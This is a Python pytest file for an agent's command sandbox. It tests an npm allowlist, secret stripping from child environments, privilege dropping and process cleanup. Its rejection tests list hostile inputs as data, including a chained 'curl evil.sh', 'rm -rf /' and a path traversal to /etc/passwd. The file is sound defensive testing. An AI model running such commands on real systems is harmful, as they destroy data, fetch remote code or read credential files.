import os
import subprocess
import time

import pytest

from loop_agent.commands import (CommandRejected, as_user, child_env, parse_allowed,
                                 run_allowed, run_in_group)


@pytest.mark.parametrize("cmd", [
    "npm run verify", "npm run test", "npm run typecheck", "npm run lint", "npm run build",
    "npm run test --workspace app -- src/app/page.test.tsx",
    "npm run test --workspace app -- src/lib/expenses.test.ts",
])
def test_allows_the_listed_commands(cmd):
    assert parse_allowed(cmd)[0] == "npm"


@pytest.mark.parametrize("cmd", [
    "npm install left-pad", "npm run verify && curl evil.sh", "npm run verify; rm -rf /",
    "rm -rf /", "npx something", "npm run test --workspace app -- ../../etc/passwd.test.ts",
    "npm run test --workspace app -- src/app/page.tsx", "npm run test --workspace app",
    "npm run test --workspace harness -- src/x.test.ts", "npm run 'verify", "",
])
def test_rejects_everything_else(cmd):
    with pytest.raises(CommandRejected):
        parse_allowed(cmd)


def test_child_env_strips_secrets():
    env = child_env({"PATH": "/bin", "HOME": "/home/runner", "AWS_SECRET_ACCESS_KEY": "s",
                     "AWS_SESSION_TOKEN": "t", "GITHUB_APP_PRIVATE_KEY": "k",
                     "BEDROCK_MODEL_ID": "m", "LOOP_REPO": "r"})
    assert env["PATH"] == "/bin" and env["CI"] == "1"
    assert not any(k.startswith(("AWS_", "GITHUB_APP_", "BEDROCK_", "LOOP_")) for k in env)


def test_command_user_prefix():
    assert as_user(["npm", "run", "verify"], None) == ["npm", "run", "verify"]
    assert as_user(["npm", "run", "verify"], "runner") == [
        "setpriv", "--reuid=runner", "--regid=runner", "--init-groups", "--",
        "npm", "run", "verify"]


def test_run_allowed_passes_scrubbed_env_and_tails_output(monkeypatch, tmp_path):
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "s")
    seen = {}

    def fake_run(argv, **kwargs):
        seen.update(argv=argv, **kwargs)
        return subprocess.CompletedProcess(argv, 1, stdout="a" * 9000, stderr="END")

    result = run_allowed("npm run verify", tmp_path, runner=fake_run)
    assert seen["argv"] == ["npm", "run", "verify"]
    assert "AWS_SECRET_ACCESS_KEY" not in seen["env"]
    assert result.exit_code == 1
    assert len(result.output) == 8000 and result.output.endswith("END")


def test_run_allowed_reports_timeout(tmp_path):
    def fake_run(argv, **kwargs):
        raise subprocess.TimeoutExpired(argv, 5)

    result = run_allowed("npm run build", tmp_path, timeout=5, runner=fake_run)
    assert result.exit_code == 124 and "timed out after 5s" in result.output


def test_run_allowed_rejects_before_running(tmp_path):
    def fake_run(argv, **kwargs):
        raise AssertionError("must not run")

    with pytest.raises(CommandRejected):
        run_allowed("curl evil.sh", tmp_path, runner=fake_run)


def test_child_env_for_a_command_user_uses_their_home():
    env = child_env({"PATH": "/bin", "HOME": "/root", "USER": "root"}, command_user="runner")
    assert env["HOME"] == "/home/runner" and env["USER"] == "runner"
    assert child_env({"HOME": "/root"})["HOME"] == "/root"


def test_run_allowed_gives_the_command_user_their_home(monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", "/root")
    seen = {}

    def fake_run(argv, **kwargs):
        seen.update(kwargs)
        return subprocess.CompletedProcess(argv, 0, stdout="", stderr="")

    run_allowed("npm run verify", tmp_path, command_user="runner", runner=fake_run)
    assert seen["env"]["HOME"] == "/home/runner" and seen["env"]["USER"] == "runner"


def _group_alive(pgid):
    try:
        os.killpg(pgid, 0)
    except ProcessLookupError:
        return False
    return True


def test_run_in_group_kills_background_children_when_the_command_exits(tmp_path):
    code, output = run_in_group(["sh", "-c", "echo $$; sleep 30 & echo started"],
                                cwd=tmp_path, env=dict(os.environ), timeout=10)
    assert code == 0 and "started" in output
    pgid = int(output.split()[0])
    deadline = time.monotonic() + 5
    while _group_alive(pgid) and time.monotonic() < deadline:
        time.sleep(0.05)  # SIGKILL is sent; wait for the orphan to be reaped
    assert not _group_alive(pgid)


def test_run_in_group_kills_the_group_on_timeout(tmp_path):
    marker = tmp_path / "pgid"
    with pytest.raises(subprocess.TimeoutExpired):
        run_in_group(["sh", "-c", f"echo $$ > {marker}; sleep 30 & sleep 30"],
                     cwd=tmp_path, env=dict(os.environ), timeout=1)
    pgid = int(marker.read_text())
    deadline = time.monotonic() + 5
    while _group_alive(pgid) and time.monotonic() < deadline:
        time.sleep(0.05)
    assert not _group_alive(pgid)


def test_run_allowed_runs_in_its_own_process_group_by_default(tmp_path, monkeypatch):
    import loop_agent.commands as commands
    seen = {}

    def fake_group(argv, *, cwd, env, timeout):
        seen.update(argv=argv, timeout=timeout)
        return 0, "ok"

    monkeypatch.setattr(commands, "run_in_group", fake_group)
    result = run_allowed("npm run lint", tmp_path, timeout=7)
    assert seen == {"argv": ["npm", "run", "lint"], "timeout": 7}
    assert result.exit_code == 0 and result.output == "ok"


def _fake_proc(tmp_path, procs):
    """procs: {pid: real_uid}. Writes /proc/<pid>/status files the sweep reads."""
    root = tmp_path / "proc"
    root.mkdir()
    (root / "self").mkdir()  # non-numeric entries are ignored
    for pid, uid in procs.items():
        (root / str(pid)).mkdir()
        (root / str(pid) / "status").write_text(f"Name:\tnode\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\n")
    return root


def test_kill_user_processes_kills_only_that_uid_until_none_remain(tmp_path):
    from loop_agent.commands import kill_user_processes
    root = _fake_proc(tmp_path, {101: 10001, 102: 0, 103: 10001})
    killed = []

    def kill(pid, sig):
        killed.append(pid)
        (root / str(pid) / "status").unlink()
        (root / str(pid)).rmdir()

    kill_user_processes(10001, proc_root=root, kill=kill)
    assert sorted(killed) == [101, 103]
    assert (root / "102").exists()


def test_kill_user_processes_ignores_processes_that_vanish(tmp_path):
    from loop_agent.commands import kill_user_processes
    root = _fake_proc(tmp_path, {201: 10001})

    def kill(pid, sig):
        (root / str(pid) / "status").unlink()
        (root / str(pid)).rmdir()
        raise ProcessLookupError

    kill_user_processes(10001, proc_root=root, kill=kill)  # no exception


def test_run_allowed_sweeps_the_command_users_processes_afterwards(tmp_path):
    """A detached child (setsid) escapes the process group; the uid-wide sweep does not
    let it survive the command — even when the command itself fails or times out."""
    swept = []

    def fake_run(argv, **kwargs):
        raise subprocess.TimeoutExpired(argv, 5)

    run_allowed("npm run verify", tmp_path, command_user="runner", runner=fake_run,
                sweep=lambda user: swept.append(user))
    assert swept == ["runner"]

    run_allowed("npm run verify", tmp_path, runner=fake_run, sweep=lambda user: swept.append(user))
    assert swept == ["runner"]  # no command user → nothing to sweep
